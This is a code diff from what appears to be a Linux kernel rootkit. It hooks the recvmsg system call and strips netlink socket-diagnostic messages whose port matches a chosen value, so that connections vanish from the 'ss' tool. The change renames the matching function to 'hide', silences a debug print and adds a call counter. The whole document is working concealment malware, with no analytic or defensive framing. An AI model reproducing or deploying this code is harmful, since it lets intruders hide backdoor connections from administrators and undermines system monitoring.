@@ -114,14 +114,14 @@ static int manipulated_udp_show(struct seq_file* m, void *v)
 }
 
 /* Check if we need to hide this socket */
-static int checkport(struct nlmsghdr *nlh)
+static int hide(struct nlmsghdr *nlh)
 {
 	struct inet_diag_msg *r = NLMSG_DATA(nlh);
-    	int lport = ntohs(r->id.idiag_sport);
+    	int port = ntohs(r->id.idiag_sport);
 	
-	if(lport == port_number && strcmp(tlp_version, "tcp") == 0)
+	if(port == port_number && strcmp(tlp_version, "tcp") == 0)
 	{
-		printk("matched the version \n");
+		//printk("matched the version \n");
 		return 1;
 	}
 	
@@ -131,54 +131,52 @@ static int checkport(struct nlmsghdr *nlh)
 /* our custom recvmsg, checks for the port number and hides it from ss*/
 asmlinkage ssize_t manipulated_recvmsg(int sockfd, struct msghdr *msg, int flags)
 {
-	
+	call_counter++;	
 	long ret;
     	long count; 
-    	struct nlmsghdr* h;
-    	char* currhdr;
+    	struct nlmsghdr *nlh;
+    	char* stream;
     	int i;
     	int found=0;
     	int offset;
-
 		
-        h = (struct nlmsghdr*)(msg->msg_iov->iov_base);
+        nlh = (struct nlmsghdr*)(msg->msg_iov->iov_base);
 	
 	// compute the length of original call 
         ret = original_recvmsg(sockfd,msg,flags);
         
-	// count holds the bytes remaining
+	// to hold the bytes remaining
         count = ret;
         
-	// now, we remove the sockets to be hidden from the result...
         found = 1;
 	
-	while (NLMSG_OK(h, count)) 
+	while (NLMSG_OK(nlh, count)) //returns true if netlink message is suitable for 	parsing
 	{
-            	if (found == 0)
+            	if (found == 0) // if port is not found, get the next nlmsghsr in multipart message
 		{
-                	h = NLMSG_NEXT(h, count);
+                	nlh = NLMSG_NEXT(nlh, count); 
             	}
-            
-		currhdr = (char*)h;
-            	if (checkport(h))
+		
+		stream = (char*)nlh;
+
+            	if (hide(nlh))
 	    	{
                 	found = 1;
-	                offset = NLMSG_ALIGN((h)->nlmsg_len);
+	                offset = NLMSG_ALIGN((nlh)->nlmsg_len);
         	        for (i=0; i<count; ++i)
 			{
-                	    	// "NLMSG_ALIGN((nlh)->nlmsg_len)" computes the length of the nlmsghdr nlh in bytes.
-                    		currhdr[i] = currhdr[i + offset];
+                    		stream[i] = stream[i + offset];
                 	}
                 
 			ret = ret - offset;
             	}	
-            
 		else 
 		{
                 	found = 0;
             	}
         }
 	
+	call_counter--;	
 	return ret;
 }
 
